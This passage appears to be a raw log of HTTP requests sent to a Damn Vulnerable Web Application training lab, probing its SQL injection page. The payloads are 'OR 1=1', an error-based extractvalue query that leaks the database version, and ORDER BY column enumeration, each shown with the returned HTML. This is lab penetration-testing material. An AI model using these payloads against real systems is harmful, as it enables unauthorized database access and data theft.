+				&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../.&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../instructions.php&quot;&gt;Instructions&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../setup.php&quot;&gt;Setup / Reset DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/brute/&quot;&gt;Brute Force&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/exec/&quot;&gt;Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csrf/&quot;&gt;CSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/fi/.?page=include.php&quot;&gt;File Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/upload/&quot;&gt;File Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/captcha/&quot;&gt;Insecure CAPTCHA&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;selected&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli/&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli_blind/&quot;&gt;SQL Injection (Blind)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/weak_id/&quot;&gt;Weak Session IDs&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_d/&quot;&gt;XSS (DOM)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_r/&quot;&gt;XSS (Reflected)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_s/&quot;&gt;XSS (Stored)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csp/&quot;&gt;CSP Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/javascript/&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../security.php&quot;&gt;DVWA Security&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../phpinfo.php&quot;&gt;PHP Info&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../about.php&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+				&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_body&quot;&gt;
+
+				
+&lt;div class=&quot;body_padded&quot;&gt;
+	&lt;h1&gt;Vulnerability: SQL Injection&lt;/h1&gt;
+
+	
+
+	&lt;div class=&quot;vulnerable_code_area&quot;&gt;
+		&lt;form action=&quot;#&quot; method=&quot;GET&quot;&gt;
+			&lt;p&gt;
+				User ID:
+				&lt;input type=&quot;text&quot; size=&quot;15&quot; name=&quot;id&quot;&gt;
+				&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;
+			&lt;/p&gt;
+
+		&lt;/form&gt;
+		&lt;pre&gt;ID: 1 OR 1=1&lt;br /&gt;First name: admin&lt;br /&gt;Surname: admin&lt;/pre&gt;
+	&lt;/div&gt;
+
+	&lt;h2&gt;More Information&lt;/h2&gt;
+	&lt;ul&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&quot; target=&quot;_blank&quot;&gt;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/SQL_injection&quot; target=&quot;_blank&quot;&gt;https://en.wikipedia.org/wiki/SQL_injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&quot; target=&quot;_blank&quot;&gt;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&quot; target=&quot;_blank&quot;&gt;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/SQL_Injection&quot; target=&quot;_blank&quot;&gt;https://www.owasp.org/index.php/SQL_Injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://bobby-tables.com/&quot; target=&quot;_blank&quot;&gt;http://bobby-tables.com/&lt;/a&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+&lt;/div&gt;
+
+				&lt;br /&gt;&lt;br /&gt;
+				
+
+			&lt;/div&gt;
+
+			&lt;div class=&quot;clear&quot;&gt;
+			&lt;/div&gt;
+
+			&lt;div id=&quot;system_info&quot;&gt;
+				&lt;input type=&quot;button&quot; value=&quot;View Help&quot; class=&quot;popup_button&quot; id=&#x27;help_button&#x27; data-help-url=&#x27;../../vul</pre></details><details><summary>Transcript r10: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1+OR+1%3D2&amp;Submit=Submit -> 200</summary><pre>
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
+
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+
+	&lt;head&gt;
+		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+
+		&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;
+
+		&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../../dvwa/css/main.css&quot; /&gt;
+
+		&lt;link rel=&quot;icon&quot; type=&quot;\image/ico&quot; href=&quot;../../favicon.ico&quot; /&gt;
+
+		&lt;script type=&quot;text/javascript&quot; src=&quot;../../dvwa/js/dvwaPage.js&quot;&gt;&lt;/script&gt;
+
+	&lt;/head&gt;
+
+	&lt;body class=&quot;home&quot;&gt;
+		&lt;div id=&quot;container&quot;&gt;
+
+			&lt;div id=&quot;header&quot;&gt;
+
+				&lt;img src=&quot;../../dvwa/images/logo.png&quot; alt=&quot;Damn Vulnerable Web Application&quot; /&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_menu&quot;&gt;
+
+				&lt;div id=&quot;main_menu_padded&quot;&gt;
+				&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../.&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../instructions.php&quot;&gt;Instructions&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../setup.php&quot;&gt;Setup / Reset DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/brute/&quot;&gt;Brute Force&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/exec/&quot;&gt;Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csrf/&quot;&gt;CSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/fi/.?page=include.php&quot;&gt;File Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/upload/&quot;&gt;File Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/captcha/&quot;&gt;Insecure CAPTCHA&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;selected&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli/&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli_blind/&quot;&gt;SQL Injection (Blind)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/weak_id/&quot;&gt;Weak Session IDs&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_d/&quot;&gt;XSS (DOM)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_r/&quot;&gt;XSS (Reflected)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_s/&quot;&gt;XSS (Stored)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csp/&quot;&gt;CSP Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/javascript/&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../security.php&quot;&gt;DVWA Security&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../phpinfo.php&quot;&gt;PHP Info&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../about.php&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+				&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_body&quot;&gt;
+
+				
+&lt;div class=&quot;body_padded&quot;&gt;
+	&lt;h1&gt;Vulnerability: SQL Injection&lt;/h1&gt;
+
+	
+
+	&lt;div class=&quot;vulnerable_code_area&quot;&gt;
+		&lt;form action=&quot;#&quot; method=&quot;GET&quot;&gt;
+			&lt;p&gt;
+				User ID:
+				&lt;input type=&quot;text&quot; size=&quot;15&quot; name=&quot;id&quot;&gt;
+				&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;
+			&lt;/p&gt;
+
+		&lt;/form&gt;
+		&lt;pre&gt;ID: 1 OR 1=2&lt;br /&gt;First name: admin&lt;br /&gt;Surname: admin&lt;/pre&gt;
+	&lt;/div&gt;
+
+	&lt;h2&gt;More Information&lt;/h2&gt;
+	&lt;ul&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&quot; target=&quot;_blank&quot;&gt;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/SQL_injection&quot; target=&quot;_blank&quot;&gt;https://en.wikipedia.org/wiki/SQL_injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&quot; target=&quot;_blank&quot;&gt;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&quot; target=&quot;_blank&quot;&gt;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/SQL_Injection&quot; target=&quot;_blank&quot;&gt;https://www.owasp.org/index.php/SQL_Injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://bobby-tables.com/&quot; target=&quot;_blank&quot;&gt;http://bobby-tables.com/&lt;/a&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+&lt;/div&gt;
+
+				&lt;br /&gt;&lt;br /&gt;
+				
+
+			&lt;/div&gt;
+
+			&lt;div class=&quot;clear&quot;&gt;
+			&lt;/div&gt;
+
+			&lt;div id=&quot;system_info&quot;&gt;
+				&lt;input type=&quot;button&quot; value=&quot;View Help&quot; class=&quot;popup_button&quot; id=&#x27;help_button&#x27; data-help-url=&#x27;../../vul</pre></details><details><summary>Transcript r11: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+AND+extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--+-&amp;Submit=Submit -> 200</summary><pre>&lt;pre&gt;XPATH syntax error: &#x27;~10.1.26-MariaDB-0+deb9u1&#x27;&lt;/pre&gt;</pre></details><details><summary>Transcript r12: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+ORDER+BY+1--+-&amp;Submit=Submit -> 200</summary><pre>
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
+
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+
+	&lt;head&gt;
+		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+
+		&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;
+
+		&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../../dvwa/css/main.css&quot; /&gt;
+
+		&lt;link rel=&quot;icon&quot; type=&quot;\image/ico&quot; href=&quot;../../favicon.ico&quot; /&gt;
+
+		&lt;script type=&quot;text/javascript&quot; src=&quot;../../dvwa/js/dvwaPage.js&quot;&gt;&lt;/script&gt;
+
+	&lt;/head&gt;
+
+	&lt;body class=&quot;home&quot;&gt;
+		&lt;div id=&quot;container&quot;&gt;
+
+			&lt;div id=&quot;header&quot;&gt;
+
+				&lt;img src=&quot;../../dvwa/images/logo.png&quot; alt=&quot;Damn Vulnerable Web Application&quot; /&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_menu&quot;&gt;
+
+				&lt;div id=&quot;main_menu_padded&quot;&gt;
+				&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../.&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../instructions.php&quot;&gt;Instructions&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../setup.php&quot;&gt;Setup / Reset DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/brute/&quot;&gt;Brute Force&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/exec/&quot;&gt;Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csrf/&quot;&gt;CSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/fi/.?page=include.php&quot;&gt;File Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/upload/&quot;&gt;File Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/captcha/&quot;&gt;Insecure CAPTCHA&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;selected&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli/&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli_blind/&quot;&gt;SQL Injection (Blind)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/weak_id/&quot;&gt;Weak Session IDs&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_d/&quot;&gt;XSS (DOM)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_r/&quot;&gt;XSS (Reflected)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_s/&quot;&gt;XSS (Stored)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csp/&quot;&gt;CSP Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/javascript/&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../security.php&quot;&gt;DVWA Security&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../phpinfo.php&quot;&gt;PHP Info&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../about.php&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+				&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_body&quot;&gt;
+
+				
+&lt;div class=&quot;body_padded&quot;&gt;
+	&lt;h1&gt;Vulnerability: SQL Injection&lt;/h1&gt;
+
+	
+
+	&lt;div class=&quot;vulnerable_code_area&quot;&gt;
+		&lt;form action=&quot;#&quot; method=&quot;GET&quot;&gt;
+			&lt;p&gt;
+				User ID:
+				&lt;input type=&quot;text&quot; size=&quot;15&quot; name=&quot;id&quot;&gt;
+				&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;
+			&lt;/p&gt;
+
+		&lt;/form&gt;
+		&lt;pre&gt;ID: 1&#x27; ORDER BY 1-- -&lt;br /&gt;First name: admin&lt;br /&gt;Surname: admin&lt;/pre&gt;
+	&lt;/div&gt;
+
+	&lt;h2&gt;More Information&lt;/h2&gt;
+	&lt;ul&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&quot; target=&quot;_blank&quot;&gt;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/SQL_injection&quot; target=&quot;_blank&quot;&gt;https://en.wikipedia.org/wiki/SQL_injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&quot; target=&quot;_blank&quot;&gt;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&quot; target=&quot;_blank&quot;&gt;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/SQL_Injection&quot; target=&quot;_blank&quot;&gt;https://www.owasp.org/index.php/SQL_Injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://bobby-tables.com/&quot; target=&quot;_blank&quot;&gt;http://bobby-tables.com/&lt;/a&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+&lt;/div&gt;
+
+				&lt;br /&gt;&lt;br /&gt;
+				
+
+			&lt;/div&gt;
+
+			&lt;div class=&quot;clear&quot;&gt;
+			&lt;/div&gt;
+
+			&lt;div id=&quot;system_info&quot;&gt;
+				&lt;input type=&quot;button&quot; value=&quot;View Help&quot; class=&quot;popup_button&quot; id=&#x27;help_button&#x27; data-help-url=&#x27;</pre></details><details><summary>Transcript r13: GET http://192.168.223.221:8081/vulnerabilities/sqli/?id=1%27+ORDER+BY+2--+-&amp;Submit=Submit -> 200</summary><pre>
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
+
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+
+	&lt;head&gt;
+		&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+
+		&lt;title&gt;Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;
+
+		&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../../dvwa/css/main.css&quot; /&gt;
+
+		&lt;link rel=&quot;icon&quot; type=&quot;\image/ico&quot; href=&quot;../../favicon.ico&quot; /&gt;
+
+		&lt;script type=&quot;text/javascript&quot; src=&quot;../../dvwa/js/dvwaPage.js&quot;&gt;&lt;/script&gt;
+
+	&lt;/head&gt;
+
+	&lt;body class=&quot;home&quot;&gt;
+		&lt;div id=&quot;container&quot;&gt;
+
+			&lt;div id=&quot;header&quot;&gt;
+
+				&lt;img src=&quot;../../dvwa/images/logo.png&quot; alt=&quot;Damn Vulnerable Web Application&quot; /&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_menu&quot;&gt;
+
+				&lt;div id=&quot;main_menu_padded&quot;&gt;
+				&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../.&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../instructions.php&quot;&gt;Instructions&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../setup.php&quot;&gt;Setup / Reset DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/brute/&quot;&gt;Brute Force&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/exec/&quot;&gt;Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csrf/&quot;&gt;CSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/fi/.?page=include.php&quot;&gt;File Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/upload/&quot;&gt;File Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/captcha/&quot;&gt;Insecure CAPTCHA&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;selected&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli/&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/sqli_blind/&quot;&gt;SQL Injection (Blind)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/weak_id/&quot;&gt;Weak Session IDs&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_d/&quot;&gt;XSS (DOM)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_r/&quot;&gt;XSS (Reflected)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/xss_s/&quot;&gt;XSS (Stored)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/csp/&quot;&gt;CSP Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../vulnerabilities/javascript/&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../security.php&quot;&gt;DVWA Security&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../phpinfo.php&quot;&gt;PHP Info&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../about.php&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class=&quot;menuBlocks&quot;&gt;&lt;li class=&quot;&quot;&gt;&lt;a href=&quot;../../logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+				&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id=&quot;main_body&quot;&gt;
+
+				
+&lt;div class=&quot;body_padded&quot;&gt;
+	&lt;h1&gt;Vulnerability: SQL Injection&lt;/h1&gt;
+
+	
+
+	&lt;div class=&quot;vulnerable_code_area&quot;&gt;
+		&lt;form action=&quot;#&quot; method=&quot;GET&quot;&gt;
+			&lt;p&gt;
+				User ID:
+				&lt;input type=&quot;text&quot; size=&quot;15&quot; name=&quot;id&quot;&gt;
+				&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;
+			&lt;/p&gt;
+
+		&lt;/form&gt;
+		&lt;pre&gt;ID: 1&#x27; ORDER BY 2-- -&lt;br /&gt;First name: admin&lt;br /&gt;Surname: admin&lt;/pre&gt;
+	&lt;/div&gt;
+
+	&lt;h2&gt;More Information&lt;/h2&gt;
+	&lt;ul&gt;
+		&lt;li&gt;&lt;a href=&quot;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&quot; target=&quot;_blank&quot;&gt;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/SQL_injection&quot; target=&quot;_blank&quot;&gt;https://en.wikipedia.org/wiki/SQL_injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&quot; target=&quot;_blank&quot;&gt;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&quot; target=&quot;_blank&quot;&gt;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/SQL_Injection&quot; target=&quot;_blank&quot;&gt;https://www.owasp.org/index.php/SQL_Injection&lt;/a&gt;&lt;/li&gt;
+		&lt;li&gt;&lt;a href=&quot;http://bobby-tables.com/&quot; target=&quot;_blank&quot;&gt;http://bobby-tables.com/&lt;/a&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+&lt;/div&gt;
+
+				&lt;br /&gt;&lt;br /&gt;
+				
+
+			&lt;/div&gt;
+
